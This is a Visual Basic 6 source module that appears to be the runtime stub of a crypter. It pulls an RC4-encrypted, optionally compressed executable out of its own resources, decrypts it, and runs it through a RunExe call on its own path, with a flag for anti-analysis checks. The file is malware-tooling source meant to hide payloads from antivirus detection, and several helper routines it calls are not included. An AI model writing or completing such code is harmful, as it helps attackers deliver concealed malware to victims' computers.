Attribute VB_Name = "Module1"
Option Explicit
Public Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Public Function vbWriteByteFile(ByVal sFileName As String, lpByte() As Byte) As Boolean
    Dim fhFile As Integer
    fhFile = FreeFile
    Open sFileName For Binary As #fhFile
    Put #fhFile, , lpByte()
    Close #fhFile
End Function
Sub Main()
Dim b1() As Byte, s1 As String, lpszEncryptionKey As String, lpSize As Long
Dim b2() As Byte, lpDecompressedSize As Long
Dim sa1() As String, lpCompress As Long, lpAntis As Long
Dim i1 As Long
'b1 = LoadFile(AppPath)
's1 = StrConv(b1, vbFromUnicode)
'    Open AppPath For Binary Access Read As #1
'        Seek #1, LOF(1) - 7
'        Get #1, , lpszEncryptionKey
'        Seek #1, LOF(1) - 15
'        Get #1, , lpSize
'        Seek #1, LOF(1) - 23
'        Get #1, , lpSettings
'        Seek #1, LOF(1) - 31
'        Get #1, , lpDecompressedSize
'        lpSize = Replace(lpSize, " ", "")
'        Seek #1, LOF(1) - 31 - CLng(lpSize)
'        ReDim b2(0 To CLng(lpSize) - 1)
'        Get #1, , b2
'    Close #1
'    lpDecompressedSize = Replace(lpDecompressedSize, " ", "")
    lpszEncryptionKey = GetResData(1000, 1001)
    lpSize = GetResData(1000, 1002)
    lpCompress = GetResData(1000, 1005)
    lpAntis = GetResData(1000, 1006)
    b1 = GetResDataBytes(1000, 1000)
    RC4 b1, lpszEncryptionKey
    If lpCompress <> 0 Then b1 = DecompressData(b1, lpSize)
    'sa1 = Split(lpSettings, ",")
    'lpCompress = CLng(sa1(0))
    'lpAntis = CLng(sa1(1))
    'If lpCompress <> 0 Then DecompressData b2, CLng(lpDecompressedSize)
    'vbWriteByteFile "output.exe", b1
    For i1 = 1 To 1000
        If RunExe(AppPath, b1) <> 0 Then Exit For
    Next
End Sub
Public Function LoadFile(ByVal sName As String) As Byte()
'dono where i got this, only used it cause i didnt wanna import API
   Dim nFile As Integer
   Dim arrFile() As Byte
   nFile = FreeFile
   Open sName For Binary As #nFile
      ReDim arrFile(LOF(nFile) - 1)
      Get #nFile, , arrFile
   Close #nFile
   LoadFile = arrFile
End Function
Public Function AppPath() As String
Dim s1 As String * 256
GetModuleFileName 0, s1, 256
AppPath = Left(s1, InStr(1, s1, Chr(0)) - 1)
End Function
